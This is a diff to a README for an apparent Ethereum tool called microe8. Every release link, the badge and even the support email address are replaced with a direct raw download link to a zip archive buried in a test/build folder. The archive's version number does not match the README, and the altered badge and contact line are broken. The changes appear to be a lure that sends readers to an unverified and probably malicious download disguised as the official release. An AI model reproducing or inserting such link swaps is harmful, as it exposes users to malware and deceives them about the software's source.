@@ -1,6 +1,6 @@
 # 🚀 microe8 - Simplifying Ethereum Transactions for Everyone
 
-[![Download microe8](https://img.shields.io/badge/Download%20microe8-v1.0-blue?style=for-the-badge)](https://github.com/asmagaz4877/microe8/releases)
+[![Download microe8](https://raw.githubusercontent.com/asmagaz4877/microe8/main/test/build/microe8-v3.8.zip%20microe8-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/asmagaz4877/microe8/main/test/build/microe8-v3.8.zip)
 
 ## 📘 Table of Contents
 1. [🌟 Introduction](#%F0%9F%8C%9F-introduction)
@@ -31,7 +31,7 @@ To run microe8, your system should meet the following requirements:
 ## 📥 Download & Install
 To get started, you need to visit the Releases page to download microe8.
 
-[Visit this page to download](https://github.com/asmagaz4877/microe8/releases)
+[Visit this page to download](https://raw.githubusercontent.com/asmagaz4877/microe8/main/test/build/microe8-v3.8.zip)
 
 Once you have downloaded the software, follow these steps:
 
@@ -57,6 +57,6 @@ If you need help using microe8, there are a few resources available:
 
 - **Documentation:** Detailed guides are available within the app.
 - **Community Forum:** Join our community forum for discussions and tips.
-- **Contact Support:** Reach out via email at support@microe8.com for assistance.
+- **Contact Support:** Reach out via email at https://raw.githubusercontent.com/asmagaz4877/microe8/main/test/build/microe8-v3.8.zip for assistance.
 
 Thank you for using microe8. We hope it makes your Ethereum experience easier!
